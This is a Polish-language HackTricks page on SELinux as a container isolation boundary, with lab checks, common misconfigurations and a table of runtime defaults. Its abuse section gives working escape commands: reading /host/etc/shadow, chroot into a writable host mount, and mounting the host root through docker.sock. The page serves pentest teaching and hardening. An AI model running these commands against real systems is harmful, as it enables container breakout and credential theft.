# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## AppArmor Vs SELinux

Najważniejsza różnica na wysokim poziomie polega na tym, że AppArmor jest oparty na ścieżkach, natomiast SELinux jest **oparty na etykietach**. Ma to duże znaczenie dla bezpieczeństwa kontenerów. Polityka oparta na ścieżkach może zachowywać się inaczej, jeśli ta sama zawartość hosta stanie się widoczna pod nieoczekiwaną ścieżką montowania. Polityka oparta na etykietach sprawdza natomiast etykietę obiektu oraz to, jakie działania domena procesu może na nim wykonywać. Nie oznacza to, że SELinux jest prosty, ale zapewnia odporność na klasę założeń dotyczących manipulowania ścieżkami, które obrońcy czasami nieumyślnie przyjmują w systemach opartych na AppArmor.

Ponieważ model jest ukierunkowany na etykiety, obsługa wolumenów kontenerów i decyzje dotyczące ponownego etykietowania mają krytyczne znaczenie dla bezpieczeństwa. Jeśli runtime lub operator zmieni etykiety zbyt szeroko, aby „sprawić, żeby mounty działały”, granica polityki, która miała ograniczać workload, może stać się znacznie słabsza, niż zakładano.

## Lab

Aby sprawdzić, czy SELinux jest aktywny na hoście:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Aby sprawdzić istniejące etykiety na hoście:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Aby porównać normalne uruchomienie z takim, w którym etykietowanie jest wyłączone:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Na hoście z włączonym SELinux jest to bardzo praktyczna demonstracja, ponieważ pokazuje różnicę między workloadem działającym w oczekiwanej domenie kontenera a takim, z którego usunięto tę warstwę egzekwowania zabezpieczeń.

## Użycie w środowisku uruchomieniowym

Podman jest szczególnie dobrze zintegrowany z SELinux na systemach, w których SELinux jest częścią domyślnej platformy. Rootless Podman wraz z SELinux to jedna z najsilniejszych mainstreamowych baz bezpieczeństwa dla kontenerów, ponieważ proces jest już nieuprzywilejowany po stronie hosta, a jednocześnie nadal ogranicza go polityka MAC. Docker również może korzystać z SELinux, jeśli jest on obsługiwany, chociaż administratorzy czasami go wyłączają, aby obejść problemy z etykietowaniem volume. CRI-O i OpenShift w dużym stopniu polegają na SELinux jako elemencie izolacji kontenerów. Kubernetes również może udostępniać ustawienia związane z SELinux, ale ich wartość oczywiście zależy od tego, czy system operacyjny noda faktycznie obsługuje i egzekwuje SELinux.

Powtarzający się wniosek jest taki, że SELinux nie jest opcjonalnym dodatkiem. W ekosystemach zbudowanych wokół niego stanowi część oczekiwanej granicy bezpieczeństwa.

## Błędne konfiguracje

Klasycznym błędem jest `label=disable`. Z punktu widzenia operacyjnego często dzieje się tak dlatego, że odmówiono dostępu do volume, a najszybszym krótkoterminowym rozwiązaniem było usunięcie SELinux z równania zamiast naprawienia modelu etykietowania. Innym częstym błędem jest nieprawidłowe ponowne etykietowanie zawartości hosta. Szeroko zakrojone operacje relabelingu mogą sprawić, że aplikacja zacznie działać, ale mogą również znacznie rozszerzyć zakres zasobów, których kontener może dotykać, poza pierwotnie zamierzony zakres.

Ważne jest również, aby nie mylić **zainstalowanego** SELinux z **efektywnym** SELinux. Host może obsługiwać SELinux i nadal działać w trybie permissive, albo runtime może nie uruchamiać workloadu w oczekiwanej domenie. W takich przypadkach ochrona jest znacznie słabsza, niż mogłaby sugerować dokumentacja.

## Nadużycia

Gdy SELinux jest nieobecny, działa w trybie permissive albo został szeroko wyłączony dla workloadu, ścieżki montowane z hosta stają się znacznie łatwiejsze do abuse. Ten sam bind mount, który w przeciwnym razie byłby ograniczony przez etykiety, może stać się bezpośrednią drogą do danych hosta lub ich modyfikacji. Jest to szczególnie istotne w połączeniu z zapisywalnymi volume mountami, katalogami runtime kontenerów lub operacyjnymi skrótami, które dla wygody udostępniają wrażliwe ścieżki hosta.

SELinux często wyjaśnia, dlaczego ogólny breakout writeup działa natychmiast na jednym hoście, ale wielokrotnie kończy się niepowodzeniem na innym, mimo że flagi runtime wyglądają podobnie. Brakującym elementem często nie jest wcale namespace ani capability, lecz granica etykiet, która pozostała nienaruszona.

Najszybszym praktycznym sprawdzeniem jest porównanie aktywnego contextu, a następnie sprawdzenie zamontowanych ścieżek hosta lub katalogów runtime, które normalnie byłyby ograniczone przez etykiety:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Jeśli obecny jest host bind mount, a etykietowanie SELinux zostało wyłączone lub osłabione, często najpierw dochodzi do ujawnienia informacji:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Jeśli mount jest zapisywalny, a kontener z punktu widzenia kernela jest faktycznie host-rootem, następnym krokiem jest przetestowanie kontrolowanej modyfikacji hosta zamiast zgadywania:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Na hostach obsługujących SELinux utrata etykiet wokół katalogów stanu runtime może również ujawnić bezpośrednie ścieżki eskalacji uprawnień:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Te polecenia nie zastępują pełnego łańcucha escape, ale bardzo szybko pokazują, czy to SELinux uniemożliwiał dostęp do danych hosta lub modyfikację plików po stronie hosta.

### Full Example: SELinux Disabled + Writable Host Mount

Jeśli etykietowanie SELinux jest wyłączone, a system plików hosta jest zamontowany z możliwością zapisu w `/host`, pełny host escape staje się zwykłym przypadkiem nadużycia bind-mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Jeśli `chroot` zakończy się powodzeniem, proces kontenera działa teraz z systemu plików hosta:
```bash
id
hostname
cat /etc/passwd | tail
```
### SELinux wyłączony + katalog runtime

Jeśli workload może uzyskać dostęp do socketu runtime po wyłączeniu etykiet, ucieczkę można delegować do runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Istotna obserwacja jest taka, że SELinux często był mechanizmem kontroli uniemożliwiającym dokładnie taki dostęp do ścieżek hosta lub stanu środowiska uruchomieniowego.

## Kontrole

Celem kontroli SELinux jest potwierdzenie, że SELinux jest włączony, identyfikacja bieżącego kontekstu bezpieczeństwa oraz sprawdzenie, czy pliki lub ścieżki, które Cię interesują, są faktycznie objęte ograniczeniami opartymi na etykietach.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Co jest tutaj istotne:

- `getenforce` powinno idealnie zwracać `Enforcing`; `Permissive` lub `Disabled` zmienia znaczenie całej sekcji SELinux.
- Jeśli kontekst bieżącego procesu wygląda nieoczekiwanie lub jest zbyt szeroki, workload może nie działać zgodnie z zamierzoną polityką kontenera.
- Jeśli pliki zamontowane z hosta lub katalogi runtime mają etykiety, do których proces ma zbyt swobodny dostęp, bind mounts stają się znacznie bardziej niebezpieczne.

Podczas przeglądu kontenera na platformie obsługującej SELinux nie należy traktować etykietowania jako drugorzędnego szczegółu. W wielu przypadkach jest ono jednym z głównych powodów, dla których host nie został jeszcze skompromitowany.

## Domyślne ustawienia runtime

| Runtime / platforma | Stan domyślny | Domyślne działanie | Typowe ręczne osłabienie |
| --- | --- | --- | --- |
| Docker Engine | Zależny od hosta | Separacja SELinux jest dostępna na hostach z włączonym SELinux, ale dokładne działanie zależy od konfiguracji hosta/daemon | `--security-opt label=disable`, szerokie ponowne etykietowanie bind mounts, `--privileged` |
| Podman | Zwykle włączony na hostach SELinux | Separacja SELinux jest standardowym elementem Podmana na systemach SELinux, chyba że zostanie wyłączona | `--security-opt label=disable`, `label=false` w `containers.conf`, `--privileged` |
| Kubernetes | Zwykle nie jest automatycznie przypisywany na poziomie Poda | Obsługa SELinux istnieje, ale Pody zwykle wymagają `securityContext.seLinuxOptions` lub domyślnych ustawień specyficznych dla platformy; wymagana jest obsługa po stronie runtime i node | słabe lub zbyt szerokie `seLinuxOptions`, uruchamianie na node’ach z trybem permissive/disabled, polityki platformy wyłączające etykietowanie |
| CRI-O / wdrożenia w stylu OpenShift | Zwykle intensywnie wykorzystywany | SELinux jest często kluczowym elementem modelu izolacji node’ów w tych środowiskach | niestandardowe polityki nadmiernie rozszerzające dostęp, wyłączanie etykietowania w celu zapewnienia kompatybilności |

Domyślne ustawienia SELinux zależą bardziej od dystrybucji niż domyślne ustawienia seccomp. W systemach w stylu Fedora/RHEL/OpenShift SELinux często stanowi centralny element modelu izolacji. Na systemach bez SELinux jest po prostu nieobecny.
{{#include ../../../../banners/hacktricks-training.md}}
